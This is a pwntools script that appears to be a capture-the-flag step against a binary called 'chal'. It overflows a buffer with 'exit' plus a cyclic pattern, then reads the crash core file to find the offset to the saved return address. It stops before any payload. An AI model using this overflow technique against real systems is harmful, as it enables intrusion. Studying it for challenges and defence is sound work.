from pwn import *
context.arch='amd64'
context.log_level='error'
e=ELF("chal")

# Confirm offset to saved RIP by crashing with cyclic, run under the loader.
p = process("./chal")
p.recvuntil(b">> ")
# Must start with something that is NOT "exit" won't matter for crash detection; but to RETURN we need "exit".
# For offset detection, send "exit"+cyclic so main returns into cyclic.
payload = b"exit" + cyclic(200, n=8)[4:]   # keep total pattern aligned; first 4 bytes 'exit'
p.sendline(payload)  # sendline adds \n (0x0a, non-null) -> but read reads 0x80; \n is fine (non-null)
try:
    p.recvall(timeout=2)
except: pass
p.wait()
core = p.corefile
rip = core.rip
print("RIP=",hex(rip))
try:
    off = cyclic_find(p64(rip), n=8)
    print("cyclic offset (from pattern start after 'exit'):", off)
except Exception as ex:
    print("find err", ex, "rsp bytes:", core.read(core.rsp,16).hex())
print("rsp-8..:", core.read(core.rsp-32,64).hex())
